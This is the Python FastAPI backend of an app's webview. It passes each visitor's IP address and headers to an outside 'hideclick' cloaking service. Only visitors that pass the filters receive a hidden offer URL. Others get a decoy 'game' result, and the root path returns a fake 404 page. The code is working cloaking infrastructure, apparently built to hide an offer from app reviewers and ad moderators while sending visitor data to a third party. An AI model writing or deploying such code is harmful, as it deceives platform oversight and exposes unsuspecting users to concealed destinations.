import socket
import json
from pathlib import Path
import httpx
from urllib.parse import urlencode

from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse, FileResponse, PlainTextResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles

import config as cfg

app = FastAPI()

BASE_DIR = Path(__file__).resolve().parent
POLICY_DIR = BASE_DIR / "PrivacyPolicy"

def is_webview_enabled() -> bool:
    return cfg.webview_power_state.strip().lower() == "on"


def resolve_hideclick_host() -> str:
    for domain in ("api.hideapi.xyz", "hideapi.net"):
        try:
            ip = socket.gethostbyname(domain)
            if ip != domain:
                return ip
        except Exception:
            continue
    return "api.hideapi.xyz"


async def check_hideclick(request: Request) -> dict | None:
    ip = request.headers.get("x-forwarded-for", "").split(",")[0].strip()
    if not ip:
        ip = request.headers.get("x-real-ip", request.client.host if request.client else "127.0.0.1")

    headers_data = {
        "HTTP_USER_AGENT": request.headers.get("user-agent", ""),
        "HTTP_ACCEPT_LANGUAGE": request.headers.get("accept-language", ""),
        "HTTP_ACCEPT": request.headers.get("accept", ""),
        "HTTP_HOST": request.headers.get("host", ""),
        "REMOTE_ADDR": ip,
        "HTTP_REFERER": request.headers.get("referer", ""),
        "HTTP_CF_CONNECTING_IP": request.headers.get("cf-connecting-ip", ""),
        "HTTP_X_FORWARDED_FOR": request.headers.get("x-forwarded-for", ""),
        "HTTP_X_REAL_IP": request.headers.get("x-real-ip", ""),
        "REQUEST_METHOD": request.method,
        "path": str(request.url.path),
    }

    params = {
        "ip": ip,
        "port": "0",
        "key": cfg.hideclick_api_key,
        "sign": "v2-1940276148",
        "js": "false",
        "stage": cfg.hideclick_stage,
        "version": cfg.hideclick_version,
        "groupByDomain": cfg.hideclick_group,
        "offer": cfg.offer_url,
        "white": "game",
        "omet": "302",
        "wmet": "none",
    }

    optional = {
        "DEBUG_MODE": cfg.debug_mode,
        "FILTER_GEO_MODE": cfg.filter_geo_mode,
        "FILTER_GEO_LIST": cfg.filter_geo_list,
        "FILTER_NET_MODE": cfg.filter_net_mode,
        "FILTER_NET_LIST": cfg.filter_net_list,
        "FILTER_UTM_MODE": cfg.filter_utm_mode,
        "FILTER_UTM_LIST": cfg.filter_utm_list,
        "FILTER_REF_MODE": cfg.filter_ref_mode,
        "FILTER_REF_LIST": cfg.filter_ref_list,
        "FILTER_NOREF": cfg.filter_noref,
        "FILTER_BRO_MODE": cfg.filter_bro_mode,
        "FILTER_BRO_LIST": cfg.filter_bro_list,
        "BLOCK_DDOS": str(cfg.block_ddos).lower(),
        "USE_SESSIONS": str(cfg.use_sessions).lower(),
        "DISABLE_CACHE": str(cfg.disable_cache).lower(),
        "delay": cfg.delay_start,
        "perm": str(cfg.delay_permanent).lower(),
        "DELAY_NONBOT": str(cfg.delay_nonbot).lower(),
        "mlSet": cfg.ml_set,
    }

    for k, v in optional.items():
        if v and v != "false":
            params[k] = v

    host = resolve_hideclick_host()
    url = f"http://{host}/basic?{urlencode(params)}"

    try:
        body = json.dumps(headers_data)
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(url, content=body)
            return resp.json()
    except Exception:
        return None


@app.get("/")
def root():
    return HTMLResponse(
        content="<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>",
        status_code=404
    )


@app.get("/api/webview-target")
async def get_webview_target(request: Request) -> JSONResponse:
    if not is_webview_enabled():
        return JSONResponse(content={
            "enabled": False,
            "status": "webview_disabled",
        })

    # если фильтр ВКЛЮЧЕН
    if cfg.use_hideclick:
        result = await check_hideclick(request)

        if result and result.get("action") == "allow":
            return JSONResponse(content={
                "enabled": True,
                "status": "webview_enabled",
                "target_url": cfg.offer_url,
                "filter": "allow",
            })

        return JSONResponse(content={
            "enabled": False,
            "status": "filtered",
            "filter": result.get("action", "unknown") if result else "api_error",
        })

    # если фильтр ВЫКЛЮЧЕН
    return JSONResponse(content={
        "enabled": True,
        "status": "webview_enabled",
        "target_url": cfg.offer_url,
        "filter": "bypass",
    })


# Статика для css/js/images из папки PrivacyPolicy
app.mount("/policy-static", StaticFiles(directory=POLICY_DIR), name="policy-static")


@app.get("/policy")
def policy_page():
    return FileResponse(POLICY_DIR / "index.html")
